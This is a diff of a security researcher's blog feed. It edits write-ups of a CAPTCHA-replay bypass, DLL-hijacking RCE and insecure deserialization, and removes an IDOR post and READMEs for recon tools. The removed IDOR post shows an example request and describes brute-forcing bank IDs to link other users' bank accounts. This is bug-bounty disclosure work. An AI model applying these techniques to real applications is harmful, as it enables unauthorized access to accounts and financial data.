+&lt;p&gt;&lt;img src=&quot;/assets/images/blogs/RE/reqandresp2.png&quot; alt=&quot;img&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;Now it’s time to exploit issues and create a huge impact. Based on the decrypted data as we can see, the application is using the CAPTCHA system to protect the application from the brute-forcing and spamming vulnerabilities. If we can find a way to bypass the CAPTCHA protection then we can convince the triager to show the real imapcts like high resource usage, spamming and by create user accounts with false data. The last part creating false accounts using false data is only applicable when the application does not have data verification system. As per the recon the application is not validating anything at all, so now we can show the impact.&lt;/p&gt;
 
@@ -533,22 +1327,19 @@ Before start decrypting the json body let’s go through the code first. The bel
 &lt;h3 id=&quot;bypass&quot;&gt;Bypass&lt;/h3&gt;
 &lt;p&gt;We cannot send the same CAPTCHA response code more than once, if we do that the server will respond as below,&lt;/p&gt;
 
-&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/2 200 OK
-Content-Type: application/json; charset=utf-8
-Date: Sat, 18 Feb 2023 14:54:03 GMT
-Expires: Sat, 18 Feb 2023 14:54:03 GMT
-Cache-Control: private, max-age=0
-X-Content-Type-Options: nosniff
-X-Frame-Options: SAMEORIGIN
-Content-Security-Policy: frame-ancestors &apos;self&apos;
-X-Xss-Protection: 1; mode=block
-Content-Length: 32
-Server: GSE
-Alt-Svc: h3=&quot;:443&quot;; ma=2592000,h3-29=&quot;:443&quot;; ma=2592000
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;* &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json; charset=utf-8 &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...; Path=/; HttpOnly &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SAMEORIGIN &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nosniff &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1; mode=block &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referrer-Policy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;strict-origin-when-cross-origin &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Strict-Transport-Security&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=31536000; includeSubDomains&lt;/span&gt;
 
-)]}&apos;
-[&quot;uvresp&quot;,null,null,null,2]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;uvresp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;From the below request what i have observed is you can send the below CAPTCHA request as long as we want and it will still provide us the response code to be verified in the upcoming verification request.&lt;/p&gt;
 
@@ -568,7 +1359,7 @@ Alt-Svc: h3=&quot;:443&quot;; ma=2592000,h3-29=&quot;:443&quot;; ma=2592000
 
 &lt;p&gt;Thanks for reading!&lt;/p&gt;
 
-&lt;p&gt;Follow me on Twitter : &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;thevillagehacker&lt;/a&gt;&lt;/p&gt;</content><author><name>naveen</name></author><category term="blog" /><category term="Reverse Engineering" /><summary type="html">Target Background Target is a web application but the same can be accessed via mobile applications as well including both android and iOS apps. The target application has a centralized CDN system which clearly shows that the target has several application with similar features and the resources served are almost same. By doing subdomain enumeration the target has more than 15 application has the same tech and all of them are served by the Amazon CDN.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" /><media:content medium="image" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">DLL Injection on one of the biggest Business Automation application</title><link href="http://localhost:4000/RCE-DLL-Hijacking/" rel="alternate" type="text/html" title="DLL Injection on one of the biggest Business Automation application" /><published>2022-12-15T12:00:00+05:30</published><updated>2022-12-15T12:00:00+05:30</updated><id>http://localhost:4000/RCE-DLL-Hijacking</id><content type="html" xml:base="http://localhost:4000/RCE-DLL-Hijacking/">&lt;h2 id=&quot;dll-hijacking&quot;&gt;DLL Hijacking&lt;/h2&gt;
+&lt;p&gt;For more insights and updates, follow me on Twitter: &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;@thevillagehacker&lt;/a&gt;.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="blog" /><category term="Reverse Engineering" /><summary type="html">Target Background</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" /><media:content medium="image" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Remote Code Execution via DLL Hijacking on a Prominent Business Automation Application</title><link href="http://localhost:4000/RCE-DLL-Hijacking/" rel="alternate" type="text/html" title="Remote Code Execution via DLL Hijacking on a Prominent Business Automation Application" /><published>2022-12-15T12:00:00+05:30</published><updated>2022-12-15T12:00:00+05:30</updated><id>http://localhost:4000/RCE-DLL-Hijacking</id><content type="html" xml:base="http://localhost:4000/RCE-DLL-Hijacking/">&lt;h2 id=&quot;dll-hijacking&quot;&gt;DLL Hijacking&lt;/h2&gt;
 &lt;p&gt;DLL hijacking is a method of injecting malicious code into an application by exploiting the way some Windows applications search and load Dynamic Link Libraries (DLL).&lt;/p&gt;
 
 &lt;p&gt;Only Microsoft operating systems are susceptible to DLL hijacks.&lt;/p&gt;
@@ -694,11 +1485,14 @@ The application is nto validating the dll files, once the application is started
       &lt;li&gt;Keep antivirus software up-to-date.&lt;/li&gt;
       &lt;li&gt;Educate staff about phishing and social engineering warning signs.&lt;/li&gt;
       &lt;li&gt;Strengthen your security posture by continuously monitoring your attack surface.&lt;/li&gt;
-      &lt;li&gt;Implement a vendor risk management solution.
-Thanks for reading.&lt;/li&gt;
+      &lt;li&gt;Implement a vendor risk management solution.&lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Naveen</name></author><category term="blog" /><category term="DLL Hijacking" /><category term="RCE" /><category term="Product Security" /><summary type="html">DLL Hijacking DLL hijacking is a method of injecting malicious code into an application by exploiting the way some Windows applications search and load Dynamic Link Libraries (DLL).</summary></entry><entry><title type="html">Insecure Deserialization</title><link href="http://localhost:4000/Insecure_Deserialization/" rel="alternate" type="text/html" title="Insecure Deserialization" /><published>2022-11-09T12:00:00+05:30</published><updated>2022-11-09T12:00:00+05:30</updated><id>http://localhost:4000/Insecure_Deserialization</id><content type="html" xml:base="http://localhost:4000/Insecure_Deserialization/">&lt;p&gt;&lt;img src=&quot;/assets/images/blogs/Insecure_desrialization/1.webp&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Thanks for reading.&lt;/p&gt;
+
+&lt;p&gt;For more insights and updates, follow me on Twitter: &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;@thevillagehacker&lt;/a&gt;.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="blog" /><category term="DLL Hijacking" /><category term="Remote Code Execution (RCE)" /><category term="Product Security" /><summary type="html">DLL Hijacking DLL hijacking is a method of injecting malicious code into an application by exploiting the way some Windows applications search and load Dynamic Link Libraries (DLL).</summary></entry><entry><title type="html">Insecure Deserialization</title><link href="http://localhost:4000/Insecure_Deserialization/" rel="alternate" type="text/html" title="Insecure Deserialization" /><published>2022-11-09T12:00:00+05:30</published><updated>2022-11-09T12:00:00+05:30</updated><id>http://localhost:4000/Insecure_Deserialization</id><content type="html" xml:base="http://localhost:4000/Insecure_Deserialization/">&lt;p&gt;&lt;img src=&quot;/assets/images/blogs/Insecure_desrialization/1.webp&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Insecure Deserialization is a vulnerability that occurs when untrusted data is used to abuse the logic of an application, inflict a denial of service (DoS) attack, or even execute arbitrary code upon it being deserialized. It also occupies the #8 spot in the &lt;a href=&quot;https://www.acunetix.com/blog/articles/owasp-top-10-2017/&quot;&gt;OWASP Top 10 2017&lt;/a&gt; list.&lt;/p&gt;
@@ -836,120 +1630,4 @@ Thanks for reading.&lt;/li&gt;
 
 &lt;p&gt;Thank you for reading.&lt;/p&gt;
 
-&lt;p&gt;Follow me on Twitter : &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;thevillagehacker&lt;/a&gt;&lt;/p&gt;</content><author><name>naveen</name></author><category term="blog" /><category term="Deserialization" /><category term="Misconfiguration" /><summary type="html"></summary></entry><entry><title type="html">IDOR leads to Takeover other user’s linked bank accounts</title><link href="http://localhost:4000/IDOR/" rel="alternate" type="text/html" title="IDOR leads to Takeover other user’s linked bank accounts" /><published>2022-10-10T12:00:00+05:30</published><updated>2022-10-10T12:00:00+05:30</updated><id>http://localhost:4000/IDOR</id><content type="html" xml:base="http://localhost:4000/IDOR/">&lt;p&gt;&lt;img src=&quot;/assets/images/blogs/IDOR/access-control.svg&quot; alt=&quot;preview&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;target-information&quot;&gt;Target Information&lt;/h2&gt;
-&lt;p&gt;The target is a web application which will help the organization to track and pay their invoices, bills and other transactions. It’s totally a business banking application.&lt;/p&gt;
-
-&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
-&lt;p&gt;Post checking all the feature and i have figured out that the application is vulnerable to IDOR because the application performs the actions on APIs based on the input details that the application pass through the URL and in JSON Objects of the request body.&lt;/p&gt;
-
-&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
-&lt;p&gt;I have exploited several endpoints to view and edit other organization’s users invoices, able to access their transaction details and other bills.&lt;/p&gt;
-
-&lt;p&gt;Here comes the fun part that the application have a feature that you can add your bank accounts into the application and once the account is merged the application will provide you a virtual bank account which will be like &lt;strong&gt;ABC Virtual Bank account&lt;/strong&gt; from &lt;strong&gt;ABC Internet Bank&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;The application allow the users to add n-number of bank accounts to the &lt;strong&gt;ABC Virtual Bank account&lt;/strong&gt; so in order to quickly find  the bank account details the application have a feature to rename the account name as any nicknames like the request below,&lt;/p&gt;
-
-&lt;h2 id=&quot;request&quot;&gt;Request&lt;/h2&gt;
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;PUT /connected_banking/12345
-Host: app.abc.com
-
-{
-	&quot;bankid&quot;: 12345,
-	&quot;account_nickname&quot;: thevillagehacker,
-	&quot;account_id&quot;: 1111,
-	&quot;company_id&quot;: 0000
-}
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;response&quot;&gt;Response&lt;/h2&gt;
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;HTTP/2 200 OK
-{
-	&quot;abc_account_id&quot;: 12345,
-	&quot;account_nickname&quot;: thevillagehacker,
-	&quot;account_id&quot;: 1111,
-	&quot;company_id&quot;: 0000,
-	&quot;current_balance&quot;: XXXX.XX
-}
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;The above request shows that the application is using the details of the bank id from the URL and the JSON object in the request body. So by bruteforcing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bankid&lt;/code&gt; lead me to change the nicknames of other users bank account nickname.&lt;/p&gt;
-
-&lt;p&gt;And the IDOR didn’t stopped right there, whenever i changed the nickname of users bank accounts those bank accounts were linked to my &lt;strong&gt;ABC Virtual Bank account&lt;/strong&gt;. So now other users bank accounts are linked to me and i can access their bank account details, balances, transactions and etc,&lt;/p&gt;
-
-&lt;p&gt;Thanks for reading.&lt;/p&gt;
-
-&lt;p&gt;Follow me on Twitter : &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;thevillagehacker&lt;/a&gt;&lt;/p&gt;</content><author><name>naveen</name></author><category term="blog" /><category term="Account Takeover" /><category term="Broken Access Control" /><category term="IDOR" /><summary type="html"></summary></entry><entry><title type="html">URLScrapy</title><link href="http://localhost:4000/urlscrapy/" rel="alternate" type="text/html" title="URLScrapy" /><published>2022-08-22T22:10:00+05:30</published><updated>2022-08-22T22:10:00+05:30</updated><id>http://localhost:4000/urlscrapy</id><content type="html" xml:base="http://localhost:4000/urlscrapy/">&lt;p&gt;&lt;img src=&quot;/assets/images/Projects/urlscrapy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;urlscrapy---github&quot;&gt;&lt;a href=&quot;https://github.com/thevillagehacker/urlscrapy&quot;&gt;urlscrapy - GitHub&lt;/a&gt;&lt;/h1&gt;
-&lt;p&gt;A web scrapper to extract the URLs embedded on the Website.&lt;/p&gt;
-
-&lt;h2 id=&quot;installation&quot;&gt;Installation&lt;/h2&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; github.com/thevillagehacker/urlscrapy@latest
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;or&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/thevillagehacker/urlscrapy.git
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;urlscrapy
-go build
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;urlscrapy&lt;/strong&gt; binary will be created and Move the binary to the required folder and add the path to the environment variables.&lt;/p&gt;
-
-&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go run urlscrapy.go &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://example.com
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;or&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;urlscrapy &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://example.com
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;example&quot;&gt;Example&lt;/h3&gt;
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;urlscrapy &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://example.com | httpx -&amp;lt;flags&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Naveen</name></author><category term="project" /><category term="Recon" /><category term="web scraper" /><category term="wordlist" /><summary type="html"></summary></entry><entry><title type="html">FileFetcher</title><link href="http://localhost:4000/filefetcher/" rel="alternate" type="text/html" title="FileFetcher" /><published>2022-05-03T22:10:00+05:30</published><updated>2022-05-03T22:10:00+05:30</updated><id>http://localhost:4000/filefetcher</id><content type="html" xml:base="http://localhost:4000/filefetcher/">&lt;p&gt;&lt;img src=&quot;/assets/images/Projects/filefetcher.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;filefetcher&quot;&gt;&lt;a href=&quot;https://github.com/thevillagehacker/FileFetcher&quot;&gt;FileFetcher&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Fetcher fetches js, JSON, PHP, txt file endpoints, and other sensitive file endpoints like pdf, xlsx, Docx, and CSV from a list of URLs from waybackurls output and 
-URLs that user-supplied as input to the fetcher.&lt;/p&gt;
-
-&lt;h2 id=&quot;prerequisite&quot;&gt;prerequisite&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/tomnomnom/waybackurls&quot;&gt;waybackurls&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x fetcher.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;to-run-fetcher-against-single-target-as-input&quot;&gt;To run fetcher against single target as input&lt;/h3&gt;
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./fetcher.sh &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; example.com
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;to-fetch-endpoints-from-input-file-which-contains-urls&quot;&gt;To fetch endpoints from input file which contains URLs&lt;/h3&gt;
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./fetcher.sh &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; url.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;note&quot;&gt;Note&lt;/h4&gt;
-&lt;p&gt;All Output results are stored separately in results folder&lt;/p&gt;</content><author><name>Naveen</name></author><category term="project" /><category term="Recon" /><category term="Files" /><category term="Enumeration" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://github.com/thevillagehacker/thevillagehacker/raw/master/Do%20Hacks%20to%20Secure.gif" /><media:content medium="image" url="https://github.com/thevillagehacker/thevillagehacker/raw/master/Do%20Hacks%20to%20Secure.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Bigfoot</title><link href="http://localhost:4000/Bigfoot/" rel="alternate" type="text/html" title="Bigfoot" /><published>2022-03-21T22:10:00+05:30</published><updated>2022-03-21T22:10:00+05:30</updated><id>http://localhost:4000/Bigfoot</id><content type="html" xml:base="http://localhost:4000/Bigfoot/">&lt;p&gt;&lt;img src=&quot;/assets/images/Projects/bigfoot.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;bigfoot&quot;&gt;&lt;a href=&quot;https://github.com/thevillagehacker/Bigfoot&quot;&gt;Bigfoot&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Bigfoot is made for checking the subdomains which are vulnerable to takeover.&lt;/p&gt;
-
-&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;
-&lt;p&gt;To scan single target&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bigfoot.sh &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; example.com
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;To scan multiple targets&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bigfoot.sh &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; hosts.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;note-&quot;&gt;Note:-&lt;/h2&gt;
-&lt;p&gt;As for now Bigfoot is only capable to check the domains which are using &lt;strong&gt;heroku, Github, AWS, Bitbucket, Shopify, Tumblr, and wordpress&lt;/strong&gt; services.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="project" /><category term="Recon" /><category term="Subdomain Takeover" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://github.com/thevillagehacker/thevillagehacker/raw/master/Do%20Hacks%20to%20Secure.gif" /><media:content medium="image" url="https://github.com/thevillagehacker/thevillagehacker/raw/master/Do%20Hacks%20to%20Secure.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Enumerate HTTP Methods</title><link href="http://localhost:4000/enum-http-methods/" rel="alternate" type="text/html" title="Enumerate HTTP Methods" /><published>2022-03-11T22:10:00+05:30</published><updated>2022-03-11T22:10:00+05:30</updated><id>http://localhost:4000/enum-http-methods</id><content type="html" xml:base="http://localhost:4000/enum-http-methods/">&lt;p&gt;&lt;img src=&quot;/assets/images/Projects/http-methods.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;http-methods&quot;&gt;&lt;a href=&quot;https://github.com/thevillagehacker/Enum-HTTP-Methods&quot;&gt;HTTP-Methods&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Automate HTTP methods enumeration using go and python.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="project" /><category term="Recon" /><category term="HTTP-Methods" /><category term="Enumeration" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://github.com/thevillagehacker/thevillagehacker/raw/master/Do%20Hacks%20to%20Secure.gif" /><media:content medium="image" url="https://github.com/thevillagehacker/thevillagehacker/raw/master/Do%20Hacks%20to%20Secure.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;p&gt;Follow me on Twitter : &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;thevillagehacker&lt;/a&gt;&lt;/p&gt;</content><author><name>naveen</name></author><category term="blog" /><category term="Deserialization" /><category term="Misconfiguration" /><summary type="html"></summary></entry></feed>
